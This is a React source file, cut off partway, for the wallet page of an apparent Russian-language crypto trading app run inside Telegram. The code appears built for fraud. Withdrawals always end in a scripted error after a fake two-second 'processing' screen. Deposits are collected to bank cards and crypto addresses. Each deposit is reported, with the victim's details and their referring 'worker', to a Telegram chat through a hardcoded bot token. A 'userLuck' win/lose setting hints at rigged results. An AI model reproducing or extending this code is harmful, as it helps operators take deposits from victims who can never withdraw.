import React, { useState } from 'react';
import { ArrowUpRight, ArrowDownLeft, History, Wallet, Plus, X, Copy, Check, CreditCard, AlertCircle, TrendingUp, TrendingDown, Sparkles, Bitcoin, RefreshCw, Clock, CheckCircle, XCircle } from 'lucide-react';
import { UsdtIcon, getCryptoIcon } from '../icons';
import { supabase } from '../supabaseClient';
import { notifyDeposit, notifyWithdraw } from '../utils/notifications';
import type { Transaction, DbSettings } from '../types';

interface WalletPageProps {
  history: Transaction[];
  balance: number;
  onDeposit: (amount: number, method: string) => void;
  onWithdraw: (amount: number) => void;
  settings: DbSettings;
  onModalChange?: (isOpen: boolean) => void;
  userLuck?: 'win' | 'lose' | 'default';
  isKyc?: boolean;
}

type DepositMethod = 'card' | 'crypto';

interface WithdrawRequest {
  id: string;
  amount: number;
  status: 'pending' | 'completed' | 'rejected';
  date: string;
}

const WalletPage: React.FC<WalletPageProps> = ({ history, balance, onDeposit, onWithdraw, settings, onModalChange, userLuck = 'default', isKyc = false }) => {
    const [activeModal, setActiveModal] = useState<'deposit' | 'withdraw' | 'converter' | 'processing' | 'withdraw-error' | null>(null);
    const [depositMethod, setDepositMethod] = useState<DepositMethod | null>(null);
    const [copied, setCopied] = useState(false);
    const [depositAmount, setDepositAmount] = useState('5000');
    const [withdrawAmount, setWithdrawAmount] = useState('');
    const [withdrawAddress, setWithdrawAddress] = useState('');
    const [withdrawError, setWithdrawError] = useState<string | null>(null);
    const [selectedCountry, setSelectedCountry] = useState('Россия');
    const [uploadedScreenshot, setUploadedScreenshot] = useState<File | null>(null);
    const [screenshotPreview, setScreenshotPreview] = useState<string | null>(null);
    
    // Converter state
    const [convertFrom, setConvertFrom] = useState('RUB');
    const [convertTo, setConvertTo] = useState('USDT');
    const [convertAmount, setConvertAmount] = useState('1000');

    // Список стран и их валют
    const countries = [
        { name: 'Россия', currency: 'RUB', flag: '🇷🇺', rate: 0.0105 },
        { name: 'Казахстан', currency: 'KZT', flag: '🇰🇿', rate: 0.0022 },
        { name: 'Узбекистан', currency: 'UZS', flag: '🇺🇿', rate: 0.000081 },
        { name: 'Киргизия', currency: 'KGS', flag: '🇰🇬', rate: 0.0115 },
        { name: 'Таджикистан', currency: 'TJS', flag: '🇹🇯', rate: 0.092 },
        { name: 'США', currency: 'USD', flag: '🇺🇸', rate: 1.0 },
        { name: 'Европа', currency: 'EUR', flag: '🇪🇺', rate: 1.08 }
    ];

    const [countryBankDetails, setCountryBankDetails] = useState<Record<string, string>>({});

    // Загружаем реквизиты по странам из Supabase
    React.useEffect(() => {
        const loadCountryBankDetails = async () => {
            try {
                const { supabase } = await import('../supabaseClient');
                
                const { data, error } = await supabase
                    .from('country_bank_details')
                    .select('country_name, bank_details')
                    .eq('is_active', true);
                
                if (error) {
                    console.error('Ошибка загрузки реквизитов:', error);
                    return;
                }
                
                const detailsMap: Record<string, string> = {};
                data?.forEach(item => {
                    detailsMap[item.country_name] = item.bank_details;
                });
                
                setCountryBankDetails(detailsMap);
            } catch (error) {
                console.error('Ошибка при загрузке реквизитов:', error);
            }
        };
        
        loadCountryBankDetails();
    }, []);

    const getCurrentCountry = () => countries.find(c => c.name === selectedCountry) || countries[0];

    const getCurrentBankDetails = () => {
        const country = getCurrentCountry();
        return countryBankDetails[country.name] || `${country.name}: Реквизиты не найдены`;
    };

    // Активные заявки на вывод
    const [withdrawRequests] = useState<WithdrawRequest[]>([
      // { id: '1', amount: 100, status: 'pending', date: '22.12.2024' },
    ]);

    const details = settings.bank_details || "Sberbank: 0000 0000 0000 0000";

    // Актуальные курсы валют
    const rates: Record<string, number> = {
      'RUB_USDT': 0.0105,
      'USDT_RUB': 95,
      'BTC_USDT': 68000,
      'USDT_BTC': 0.0000147,
      'ETH_USDT': 3500,
      'USDT_ETH': 0.000286,
    };

    const getConvertedAmount = () => {
      const key = `${convertFrom}_${convertTo}`;
      const rate = rates[key] || 1;
      return (parseFloat(convertAmount) * rate).toFixed(convertTo === 'BTC' ? 8 : 2);
    };

    const wins = history.filter(t => t.type === 'win').length;
    const losses = history.filter(t => t.type === 'loss').length;
    const totalTrades = wins + losses;
    const winRate = totalTrades > 0 ? Math.round((wins / totalTrades) * 100) : 0;

    const handleCopy = (text: string) => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const openModal = (type: 'deposit' | 'withdraw' | 'converter') => {
        setActiveModal(type);
        setDepositMethod(null);
        onModalChange?.(true);
    };

    const closeModal = () => {
        setActiveModal(null);
        setDepositMethod(null);
        setUploadedScreenshot(null);
        setScreenshotPreview(null);
        onModalChange?.(false);
    };

    const handleScreenshotUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
        const file = event.target.files?.[0];
        if (file && file.type.startsWith('image/')) {
            setUploadedScreenshot(file);
            
            // Создаем превью
            const reader = new FileReader();
            reader.onload = (e) => {
                setScreenshotPreview(e.target?.result as string);
            };
            reader.readAsDataURL(file);
        }
    };

    const removeScreenshot = () => {
        setUploadedScreenshot(null);
        setScreenshotPreview(null);
    };

    const sendToTelegram = async (depositData: {
        amount: string;
        country: string;
        currency: string;
        screenshot: File | null;
        userId: number;
    }) => {
        try {
            // Получаем данные пользователя из Supabase
            const { data: userData, error: userError } = await supabase
                .from('users')
                .select('user_id, username, full_name, referrer_id')
                .eq('user_id', depositData.userId)
                .single();

            if (userError) {
                console.error('Ошибка получения данных пользователя:', userError);
            }

            // Получаем данные воркера (реферера) если есть
            let workerData = null;
            if (userData?.referrer_id) {
                const { data: worker, error: workerError } = await supabase
                    .from('users')
                    .select('user_id, username, full_name')
                    .eq('user_id', userData.referrer_id)
                    .single();

                if (workerError) {
                    console.error('Ошибка получения данных воркера:', workerError);
                } else {
                    workerData = worker;
                }
            }

            // Формируем информацию о пользователе
            const userName = userData?.full_name || 'Неизвестно';
            const userNickname = userData?.username || 'Нет никнейма';
            const userInfo = `${userName} (${userNickname}) ID: ${userData?.user_id || depositData.userId}`;

            // Формируем информацию о воркере
            const workerInfo = workerData 
                ? `${workerData.full_name || 'Неизвестно'} (${workerData.username || 'Нет никнейма'}) ID: ${workerData.user_id}`
                : 'Прямая регистрация';

            // Добавляем текстовые данные
            const message = `
🔔 НОВАЯ ЗАЯВКА НА ПОПОЛНЕНИЕ

👤 Пользователь: ${userInfo}
👨‍💼 Воркер: ${workerInfo}
💰 Сумма: ${depositData.amount} ${depositData.currency}
💵 В USDT: ≈ $${(parseFloat(depositData.amount) * (depositData.currency === 'RUB' ? 0.0105 : depositData.currency === 'KZT' ? 0.0022 : depositData.currency === 'UZS' ? 0.000081 : depositData.currency === 'KGS' ? 0.0115 : depositData.currency === 'TJS' ? 0.092 : depositData.currency === 'USD' ? 1.0 : 1.08)).toFixed(2)}
🌍 Страна: ${depositData.country}
🏦 Валюта: ${depositData.currency}
📅 Дата: ${new Date().toLocaleString('ru-RU')}
🆔 ID заявки: ${Date.now()}

${depositData.screenshot ? '📸 Скриншот прикреплен' : '❌ Скриншот отсутствует'}

#пополнение #${depositData.country.toLowerCase().replace(' ', '_')} #${depositData.currency.toLowerCase()}
            `.trim();
            
            const botToken = '7769124785:AAE46Zt6jh9IPVt4IB4u0j8kgEVg2NpSYa0';
            const chatId = '-1003560670670';
            
            let response;
            
            if (depositData.screenshot) {
                // Отправляем с фото
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('caption', message);
                formData.append('photo', depositData.screenshot, depositData.screenshot.name);
                formData.append('parse_mode', 'HTML');
                
                response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                // Отправляем только текст для криптовалютных пополнений
                response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            }
            
            if (response.ok) {
                const result = await response.json();
                console.log('Заявка успешно отправлена в Telegram:', result);
                return true;
            } else {
                let errorData;
                try {
                    errorData = await response.json();
                } catch (e) {
                    errorData = await response.text();
                }
                console.error('Ошибка отправки в Telegram:', {
                    status: response.status,
                    statusText: response.statusText,
                    error: errorData
                });
                
                // Если ошибка с фото, попробуем отправить только текст
                if (depositData.screenshot && (response.status === 400 || (errorData && errorData.error_code === 400))) {
                    console.log('Попытка отправить только текст...');
                    const textResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message + '\n\n⚠️ Скриншот не удалось прикрепить',
                            parse_mode: 'HTML'
                        })
                    });
                    
                    if (textResponse.ok) {
                        console.log('Текстовое сообщение отправлено');
                        return true;
                    }
                }
                
                return false;
            }
        } catch (error) {
            console.error('Ошибка при отправке в Telegram:', error);
            
            // Попробуем отправить простое текстовое сообщение для диагностики
            try {
                const botToken = '7769124785:AAE46Zt6jh9IPVt4IB4u0j8kgEVg2NpSYa0';
                const chatId = '-1003560670670';
                
                const testResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: '🔧 Тестовое сообщение - проверка доступа бота к каналу',
                    })
                });
                
                if (testResponse.ok) {
                    console.log('Тестовое сообщение отправлено успешно');
                } else {
                    const testError = await testResponse.json();
                    console.error('Ошибка тестового сообщения:', testError);
                }
            } catch (testError) {
                console.error('Ошибка при отправке тестового сообщения:', testError);
            }
            
            return false;
        }
    };

    const submitDeposit = async () => {
        const val = parseFloat(depositAmount);
        if (val > 0 && depositMethod) {
            // Проверяем наличие скриншота для банковской карты
            if (depositMethod === 'card' && !uploadedScreenshot) {
                alert('Пожалуйста, прикрепите скриншот перевода');
                return;
            }
            
            // Получаем ID пользователя из Telegram WebApp или URL
            const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
            let userId = tgUser?.id;
            
            // Fallback: читаем tgid из URL
            if (!userId) {
                const urlParams = new URLSearchParams(window.location.search);
                const urlTgId = urlParams.get('tgid');
                if (urlTgId && !isNaN(Number(urlTgId))) {
                    userId = Number(urlTgId);
                }
            }
            
            // Последний fallback для разработки
            if (!userId) {
                userId = 12345;
            }
            
            // Отправляем данные в Telegram для всех методов
            const success = await sendToTelegram({
                amount: depositAmount,
                country: depositMethod === 'card' ? selectedCountry : 'Криптовалюта',
                currency: depositMethod === 'card' ? getCurrentCountry().currency : 'USDT',
                screenshot: depositMethod === 'card' ? uploadedScreenshot : null,
                userId: userId
            });
            
            if (success) {
                // Уведомляем воркера о пополнении
                const currency = depositMethod === 'card' ? getCurrentCountry().currency : 'USDT';
                const methodName = depositMethod === 'card' ? 'Банковская карта' : 'Криптовалюта';
                notifyDeposit(val, currency, methodName);
                
                onDeposit(val, depositMethod);
                closeModal();
                setDepositAmount('5000');
            } else {
                alert('Ошибка при отправке заявки. Попробуйте еще раз.');
            }
        }
    };

    const submitWithdraw = () => {
        const val = parseFloat(withdrawAmount);
        if (val <= 0) return;
        if (val > balance) {
            setWithdrawError("Недостаточно средств");
            return;
        }
        
        // Показываем окно обработки
        setActiveModal('processing');
        
        // Через 2 секунды показываем ошибку
        setTimeout(() => {
            setActiveModal('withdraw-error');
        }, 2000);
    };

    // Адреса для пополнения криптовалютой
    const cryptoAddresses = {
      BTC: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
      ETH: '0x742d35Cc6634C0532925a3b844Bc9e7595f...',
      USDT: 'TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9',
    };

    return (
        <div className="h-full flex flex-col bg-black text-white relative">
            {/* Header */}
            <div className="px-4 pt-6 pb-4 shrink-0 bg-black">
                <div className="flex items-center justify-between mb-4">
                    <h1 className="text-xl font-bold flex items-center gap-2">
                        <Wallet className="text-[#0098EA]" size={22} />
                        Кошелек
                    </h1>
                    <button onClick={() => openModal('converter')} className="flex items-center gap-1.5 px-3 py-1.5 bg-[#1c1c1e] rounded-lg text-xs text-gray-400 hover:text-white">
                        <RefreshCw size={14} />
                        Конвертер
                    </button>
                </div>

                {/* Balance Card */}
                <div className="w-full rounded-2xl relative overflow-hidden bg-gradient-to-br from-[#1c1c1e] to-[#111113] border border-gray-800/50 p-4">
                    <div className="flex items-center justify-between mb-3">
                        <span className="text-gray-500 text-xs font-medium uppercase">Баланс</span>
                    </div>
                    
                    <div className="text-3xl font-bold text-white mb-4">
                        ${balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                    </div>

                    <div className="flex gap-2">
                        <button onClick={() => openModal('deposit')} className="flex-1 bg-[#0098EA] text-white rounded-xl py-2.5 flex items-center justify-center gap-2 active:scale-[0.98] font-semibold text-sm">
                            <Plus size={16} /> Пополнить
                        </button>
                        <button onClick={() => openModal('withdraw')} className="flex-1 bg-[#2c2c2e] text-white rounded-xl py-2.5 flex items-center justify-center gap-2 active:scale-[0.98] border border-gray-700/50 font-semibold text-sm">
                            <ArrowUpRight size={16} /> Вывести
                        </button>
                    </div>
                </div>
            </div>

            {/* Stats */}
            {totalTrades > 0 && (
                <div className="px-4 pb-3 shrink-0 flex gap-2">
                    <div className="flex-1 bg-[#1c1c1e] rounded-xl p-2.5 text-center">
                        <div className="text-[10px] text-gray-500 uppercase">Сделок</div>
                        <div className="font-bold">{totalTrades}</div>
                    </div>
                    <div className="flex-1 bg-[#1c1c1e] rounded-xl p-2.5 text-center">
                        <div className="text-[10px] text-gray-500 uppercase">Винрейт</div>
                        <div className={`font-bold ${winRate >= 50 ? 'text-[#00C896]' : 'text-[#FF3B30]'}`}>{winRate}%</div>
                    </div>
                    <div className="flex-1 bg-[#00C896]/10 rounded-xl p-2.5 text-center border border-[#00C896]/20">
                        <div className="text-[10px] text-[#00C896] uppercase">Win</div>
                        <div className="font-bold text-[#00C896]">{wins}</div>
                    </div>
                    <div className="flex-1 bg-[#FF3B30]/10 rounded-xl p-2.5 text-center border border-[#FF3B30]/20">
                        <div className="text-[10px] text-[#FF3B30] uppercase">Loss</div>
                        <div className="font-bold text-[#FF3B30]">{losses}</div>
                    </div>
                </div>
            )}

            {/* Withdraw Requests */}
            {withdrawRequests.length > 0 && (
                <div className="px-4 pb-3 shrink-0">
                    <div className="bg-[#1c1c1e] rounded-xl p-3 border border-gray-800/50">
                        <div className="text-xs text-gray-500 uppercase mb-2 flex items-center gap-1">
                            <Clock size={12} /> Заявки на вывод
                        </div>
                        {withdrawRequests.map(req => (
                            <div key={req.id} className="flex items-center justify-between py-2 border-t border-gray-800/30">
                                <div>
                                    <span className="font-semibold">${req.amount}</span>
                                    <span className="text-xs text-gray-500 ml-2">{req.date}</span>
                                </div>
                                <div className={`flex items-center gap-1 text-xs font-medium ${
                                    req.status === 'pending' ? 'text-yellow-500' :
                                    req.status === 'completed' ? 'text-[#00C896]' : 'text-[#FF3B30]'
                                }`}>
                                    {req.status === 'pending' && <><Clock size={12} /> В обработке</>}
                                    {req.status === 'completed' && <><CheckCircle size={12} /> Выполнено</>}
                                    {req.status === 'rejected' && <><XCircle size={12} /> Отклонено</>}
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* History */}
            <div className="flex-1 bg-[#111113] rounded-t-3xl border-t border-gray-800/50 overflow-hidden flex flex-col">
                <div className="px-4 pt-4 pb-2 flex justify-between items-center shrink-0">
                    <h2 className="font-bold text-sm">История</h2>
                    <span className="text-xs text-gray-500">{history.length}</span>
                </div>
                
                <div className="flex-1 overflow-y-auto no-scrollbar px-4 pb-24">
                    {history.length === 0 ? (
                        <div className="flex flex-col items-center justify-center py-12 text-gray-600">
                            <History size={36} className="mb-2 opacity-50" />
                            <span className="text-sm">Нет операций</span>
                        </div>
                    ) : (
                        <div className="space-y-2">
                            {history.map(tx => (
                                <div key={tx.id} className="bg-[#1c1c1e] p-3 rounded-xl flex items-center justify-between">
                                    <div className="flex items-center gap-3">
                                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${
                                            tx.type === 'win' ? 'bg-[#00C896]/15 text-[#00C896]' : 
                                            tx.type === 'loss' ? 'bg-[#FF3B30]/15 text-[#FF3B30]' : 
                                            tx.type === 'deposit' ? 'bg-[#0098EA]/15 text-[#0098EA]' :
                                            'bg-gray-800 text-gray-400'
                                        }`}>
                                            {tx.type === 'win' && <TrendingUp size={14} />}
                                            {tx.type === 'loss' && <TrendingDown size={14} />}
                                            {tx.type === 'deposit' && <ArrowDownLeft size={14} />}
                                            {tx.type === 'withdraw' && <ArrowUpRight size={14} />}
                                        </div>
                                        <div>
                                            <span className="text-sm font-medium">
                                                {tx.type === 'win' || tx.type === 'loss' ? tx.asset : 
                                                 tx.type === 'deposit' ? 'Пополнение' : 'Вывод'}
                                            </span>
                                            <span className="text-[10px] text-gray-500 block">{tx.amountUsd}</span>
                                        </div>
                                    </div>
                                    <div className={`text-sm font-bold ${
                                        tx.type === 'win' || tx.type === 'deposit' ? 'text-[#00C896]' : 'text-[#FF3B30]'
                                    }`}>{tx.amount}</div>
                                </div>
                            ))}
                        </div>
                    )}
                </div>
            </div>

            {/* Deposit Modal */}
            {activeModal === 'deposit' && (
                <div className="fixed inset-0 z-[100] flex items-end justify-center">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-lg rounded-t-3xl border-t border-gray-700/50 relative z-10 p-5 pb-8 animate-[slideUp_0.3s_ease-out] max-h-[85vh] overflow-y-auto">
                        <div className="w-10 h-1 bg-gray-700 rounded-full mx-auto mb-4"></div>
                        
                        <div className="flex justify-between items-center mb-4">
                            <h2 className="text-lg font-bold">Пополнение</h2>
                            <button onClick={closeModal} className="p-2 bg-gray-800/50 rounded-full text-gray-400">
                                <X size={18} />
                            </button>
                        </div>

                        {!depositMethod ? (
                            <div className="space-y-3">
                                <p className="text-sm text-gray-400 mb-4">Выберите способ пополнения</p>

                                <button onClick={() => setDepositMethod('card')} className="w-full bg-[#2c2c2e] p-4 rounded-xl flex items-center gap-4 hover:bg-[#3a3a3c] transition-colors border border-transparent hover:border-gray-700">
                                    <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#FF6B6B] to-[#FF3B30] flex items-center justify-center">
                                        <CreditCard size={24} className="text-white" />
                                    </div>
                                    <div className="text-left flex-1">
                                        <div className="font-semibold">Банковская карта</div>
                                        <div className="text-xs text-gray-500">Visa, Mastercard, МИР</div>
                                    </div>
                                    <div className="text-xs text-gray-500">~5 мин</div>
                                </button>

                                <button onClick={() => setDepositMethod('crypto')} className="w-full bg-[#2c2c2e] p-4 rounded-xl flex items-center gap-4 hover:bg-[#3a3a3c] transition-colors border border-transparent hover:border-gray-700">
                                    <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#F7931A] to-[#FF6B00] flex items-center justify-center">
                                        <Bitcoin size={24} className="text-white" />
                                    </div>
                                    <div className="text-left flex-1">
                                        <div className="font-semibold">Криптовалюта</div>
                                        <div className="text-xs text-gray-500">BTC, ETH, USDT</div>
                                    </div>
                                    <div className="text-xs text-gray-500">~10 мин</div>
                                </button>
                            </div>
                        ) : depositMethod === 'crypto' ? (
                            <div className="space-y-4">
                                <button onClick={() => setDepositMethod(null)} className="text-sm text-[#0098EA] mb-2">← Назад</button>
                                
                                <div className="text-center">
                                    <div className="text-sm text-gray-400 mb-3">Отправьте USDT (TRC20) на адрес:</div>
                                    
                                    {/* QR Code placeholder */}
                                    <div className="w-48 h-48 mx-auto bg-white rounded-2xl p-3 mb-4">
                                        <div className="w-full h-full bg-[url('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9')] bg-contain bg-center bg-no-repeat"></div>
                                    </div>
                                    
                                    <div className="bg-[#111113] rounded-xl p-3 flex items-center gap-2">
                                        <code className="text-xs text-white flex-1 break-all">{cryptoAddresses.USDT}</code>
                                        <button onClick={() => handleCopy(cryptoAddresses.USDT)} className={`p-2 rounded-lg ${copied ? 'bg-[#00C896]/20 text-[#00C896]' : 'bg-gray-700 text-gray-400'}`}>
                                            {copied ? <Check size={14} /> : <Copy size={14} />}
                                        </button>
                                    </div>
                                </div>

                                <div className="bg-yellow-500/10 p-3 rounded-xl border border-yellow-500/20 text-xs text-yellow-500">
                                    ⚠️ Отправляйте только USDT в сети TRC20. Другие токены будут потеряны.
                                </div>
                            </div>
                        ) : (
                            <div className="space-y-4">
                                <button onClick={() => setDepositMethod(null)} className="text-sm text-[#0098EA] mb-2">← Назад</button>
                                
                                {/* Выбор страны */}
                                <div>
                                    <label className="text-xs text-gray-500 uppercase mb-2 block">Страна</label>
                                    <div className="bg-[#111113] rounded-xl border border-gray-800 focus-within:border-[#0098EA]">
                                        <select 
                                            value={selectedCountry} 
                                            onChange={e => setSelectedCountry(e.target.value)}
                                            className="w-full bg-transparent p-3 text-white outline-none appearance-none"
                                        >
                                            {countries.map(country => (
                                                <option key={country.name} value={country.name} className="bg-[#1c1c1e]">
                                                    {country.flag} {country.name} ({country.currency})
                                                </option>
                                            ))}
                                        </select>
                                    </div>
                                </div>

                                <div>
                                    <label className="text-xs text-gray-500 uppercase mb-2 block">
                                        Сумма ({getCurrentCountry().currency})
                                    </label>
                                    <input 
                                        type="number" 
                                        value={depositAmount} 
                                        onChange={e => setDepositAmount(e.target.value)} 
                                        className="w-full bg-[#111113] rounded-xl p-3 text-lg font-bold outline-none border border-gray-800 focus:border-[#0098EA]" 
                                        placeholder={getCurrentCountry().currency === 'RUB' ? '5000' : getCurrentCountry().currency === 'USD' ? '50' : '1000'} 
                                    />
                                    <div className="text-xs text-gray-500 mt-1">
                                        ≈ ${(parseFloat(depositAmount || '0') * getCurrentCountry().rate).toFixed(2)} USDT
                                    </div>
                                </div>

                                {depositMethod === 'card' && (
                                    <>
                                        <div className="bg-[#2c2c2e] p-4 rounded-xl">
                                            <div className="text-xs text-[#0098EA] uppercase mb-2">
                                                Реквизиты для {getCurrentCountry().name}
                                            </div>
                                            <div className="flex items-center gap-2">
                                                <div className="font-mono text-sm flex-1 whitespace-pre-line">
                                                    {getCurrentBankDetails()}
                                                </div>
                                                <button 
                                                    onClick={() => handleCopy(getCurrentBankDetails())} 
                                                    className={`p-2 rounded-lg ${copied ? 'bg-[#00C896]/20 text-[#00C896]' : 'bg-gray-700 text-gray-400'}`}
                                                >
                                                    {copied ? <Check size={14} /> : <Copy size={14} />}
                                                </button>
                                            </div>
                                            <div className="text-xs text-gray-400 mt-2">
                                                {getCurrentCountry().name === 'Россия' ? 'Переводы через СБП или на карту Сбербанка' :
                                                 getCurrentCountry().name === 'Казахстан' ? 'Переводы через Kaspi или на карту банка' :
                                                 getCurrentCountry().name === 'Узбекистан' ? 'Переводы через Uzcard или Humo' :
                                                 getCurrentCountry().name === 'Киргизия' ? 'Переводы через банковскую карту' :
                                                 getCurrentCountry().name === 'Таджикистан' ? 'Переводы через банковскую карту' :
                                                 getCurrentCountry().name === 'США' ? 'Wire transfer or ACH' :
                                                 'SEPA transfer or bank card'}
                                            </div>
                                        </div>

                                        {/* Загрузка скриншота */}
                                        <div>
                                            <label className="text-xs text-gray-500 uppercase mb-2 block">
                                                Скриншот перевода *
                                            </label>
                                            
                                            {!screenshotPreview ? (
                                                <label className="w-full bg-[#111113] border-2 border-dashed border-gray-700 rounded-xl p-6 flex flex-col items-center justify-center cursor-pointer hover:border-[#0098EA] transition-colors">
                                                    <div className="w-12 h-12 rounded-full bg-[#0098EA]/20 flex items-center justify-center mb-3">
                                                        <Plus size={24} className="text-[#0098EA]" />
                                                    </div>
                                                    <span className="text-sm font-medium text-gray-300 mb-1">
                                                        Прикрепить скриншот
                                                    </span>
                                                    <span className="text-xs text-gray-500 text-center">
                                                        JPG, PNG до 10MB
                                                    </span>
                                                    <input
                                                        type="file"
                                                        accept="image/*"
                                                        onChange={handleScreenshotUpload}
                                                        className="hidden"
                                                    />
                                                </label>
                                            ) : (
                                                <div className="relative">
                                                    <img 
                                                        src={screenshotPreview} 
                                                        alt="Скриншот перевода"
                                                        className="w-full h-48 object-cover rounded-xl border border-gray-700"
                                                    />
                                                    <button
                                                        onClick={removeScreenshot}
                                                        className="absolute top-2 right-2 w-8 h-8 bg-[#FF3B30] rounded-full flex items-center justify-center text-white"
                                                    >
                                                        <X size={16} />
                                                    </button>
                                                    <div className="absolute bottom-2 left-2 bg-black/80 backdrop-blur-sm rounded-lg px-2 py-1">
                                                        <span className="text-xs text-white">
                                                            {uploadedScreenshot?.name}
                                                        </span>
                                                    </div>
                                                </div>
                                            )}
                                        </div>
                                    </>
                                )}

                                <button 
                                    onClick={submitDeposit} 
                                    disabled={depositMethod === 'card' && !uploadedScreenshot}
                                    className={`w-full font-bold py-3.5 rounded-xl active:scale-[0.98] transition-all ${
                                        depositMethod === 'card' && !uploadedScreenshot 
                                            ? 'bg-gray-600 text-gray-400 cursor-not-allowed' 
                                            : 'bg-[#00C896] text-black'
                                    }`}
                                >
                                    {depositMethod === 'card' && !uploadedScreenshot 
                                        ? 'Прикрепите скриншот' 
                                        : 'Я перевел средства'
                                    }
                                </button>
                            </div>
                        )}
                    </div>
                </div>
            )}

            {/* Withdraw Modal */}
            {activeModal === 'withdraw' && (
                <div className="fixed inset-0 z-[100] flex items-end justify-center">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-lg rounded-t-3xl border-t border-gray-700/50 relative z-10 p-5 pb-8 animate-[slideUp_0.3s_ease-out]">
                        <div className="w-10 h-1 bg-gray-700 rounded-full mx-auto mb-4"></div>
                        
                        <div className="flex justify-between items-center mb-4">
                            <h2 className="text-lg font-bold">Вывод</h2>
                            <button onClick={closeModal} className="p-2 bg-gray-800/50 rounded-full text-gray-400">
                                <X size={18} />
                            </button>
                        </div>

                        <div className="space-y-4">
                            <div className="flex items-center gap-3 bg-[#111113] p-3 rounded-xl border border-gray-800">
                                <div className="w-9 h-9 rounded-full bg-[#26A17B] flex items-center justify-center">
                                    <UsdtIcon size={20} />
                                </div>
                                <div>
                                    <div className="text-sm font-semibold">USDT</div>
                                    <div className="text-xs text-gray-500">Баланс: ${balance.toFixed(2)}</div>
                                </div>
                            </div>

                            <div>
                                <label className="text-xs text-gray-500 uppercase mb-2 block">Номер карты</label>
                                <div className="bg-[#111113] rounded-xl p-3 flex items-center border border-gray-800 focus-within:border-[#0098EA]">
                                    <CreditCard className="text-gray-500 mr-2" size={18} />
                                    <input type="text" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} placeholder="0000 0000 0000 0000" className="bg-transparent text-white font-mono outline-none w-full" />
                                </div>
                            </div>

                            <div>
                                <label className="text-xs text-gray-500 uppercase mb-2 block">Сумма</label>
                                <div className={`bg-[#111113] rounded-xl p-3 flex items-center border ${withdrawError ? 'border-[#FF3B30]' : 'border-gray-800 focus-within:border-[#0098EA]'}`}>
                                    <input type="number" placeholder="0.00" className="bg-transparent text-white text-lg font-bold outline-none w-full" value={withdrawAmount} onChange={e => { setWithdrawAmount(e.target.value); setWithdrawError(null); }} />
                                    <span className="text-gray-500 font-semibold text-sm">USD</span>
                                </div>
                                {withdrawError && <div className="flex items-center gap-1 mt-2 text-xs text-[#FF3B30]"><AlertCircle size={12} />{withdrawError}</div>}
                                <div className="text-xs text-gray-500 mt-1">Комиссия: 1 USDT</div>
                            </div>

                            <button onClick={submitWithdraw} className="w-full bg-[#0098EA] text-white font-bold py-3.5 rounded-xl active:scale-[0.98]">
                                Подтвердить вывод
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* Converter Modal */}
            {activeModal === 'converter' && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-gray-700/50 relative z-10 p-5 animate-[scaleIn_0.2s_ease-out]">
                        <div className="flex justify-between items-center mb-4">
                            <h2 className="text-lg font-bold flex items-center gap-2">
                                <RefreshCw size={18} className="text-[#0098EA]" />
                                Конвертер
                            </h2>
                            <button onClick={closeModal} className="p-2 bg-gray-800/50 rounded-full text-gray-400">
                                <X size={18} />
                            </button>
                        </div>

                        <div className="space-y-3">
                            <div className="bg-[#111113] rounded-xl p-3 border border-gray-800">
                                <div className="flex justify-between items-center mb-2">
                                    <span className="text-xs text-gray-500">Отдаю</span>
                                    <div className="flex items-center gap-2">
                                        {getCryptoIcon(convertFrom, 16)}
                                        <select value={convertFrom} onChange={e => setConvertFrom(e.target.value)} className="bg-transparent text-sm font-semibold outline-none">
                                            <option value="RUB">RUB</option>
                                            <option value="USDT">USDT</option>
                                            <option value="BTC">BTC</option>
                                            <option value="ETH">ETH</option>
                                        </select>
                                    </div>
                                </div>
                                <input type="number" value={convertAmount} onChange={e => setConvertAmount(e.target.value)} className="w-full bg-transparent text-2xl font-bold outline-none" />
                            </div>

                            <div className="flex justify-center">
                                <button onClick={() => { const t = convertFrom; setConvertFrom(convertTo); setConvertTo(t); }} className="w-10 h-10 rounded-full bg-[#2c2c2e] flex items-center justify-center text-gray-400 hover:text-white">
                                    <RefreshCw size={18} />
                                </button>
                            </div>

                            <div className="bg-[#111113] rounded-xl p-3 border border-gray-800">
                                <div className="flex justify-between items-center mb-2">
                                    <span className="text-xs text-gray-500">Получаю</span>
                                    <div className="flex items-center gap-2">
                                        {getCryptoIcon(convertTo, 16)}
